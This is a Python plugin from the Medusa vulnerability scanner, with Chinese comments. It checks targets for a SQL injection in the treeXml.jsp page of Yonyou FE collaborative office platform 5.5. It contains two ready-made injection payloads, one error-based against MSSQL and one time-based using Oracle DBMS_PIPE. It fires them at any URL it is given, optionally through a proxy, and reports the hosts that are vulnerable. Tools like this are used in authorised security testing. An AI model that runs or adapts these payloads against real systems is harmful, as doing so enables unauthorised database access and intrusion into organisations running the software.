#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib
import requests
import time
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['disclosure']='2019-10-13'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Seeyou_fe_treeXml_sqli"  # 插件名称
        self.info['name'] ='' #漏洞名称
        self.info['affects'] = "用友OA"  # 漏洞组件
        self.info['desc_content'] = "用友OA_treeXml文件sql注入漏洞"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/common/treeXml.jsp?type=sort&lx=3&code=1%27AnD%201=ConVert(Int,Char(66)%2BChar(66)%2BChar(66)%2B@@Version)--"
payload2 ="/common/treeXml.jsp?type=sort&lx=3&code=1%27%20AND%207491=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74)||CHR(65)||CHR(70)||CHR(70),6)%20AND%20%271%27=%271"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        payload_url = scheme+"://"+url+ ':' + str(port)+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if  con.lower().find('bbbmicrosoft')!=-1:
            Medusa = "{} 存在用友FE协作办公平台5.5 SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:
        payload_url2 = scheme+"://"+url+payload2
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        start_time = time.time()
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url2, headers=headers, proxies=proxies, timeout=6, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url2,headers=headers, timeout=6, verify=False)
        con = resp.text
        code = resp.status_code
        if time.time() - start_time >= 6:
            Medusa = "{} \r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url2)
            Medusas.append(str(Medusa))

    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
    _t = VulnerabilityInfo(Medusas)
    web = ClassCongregation.VulnerabilityDetails(_t.info)
    web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
    return (_t.info)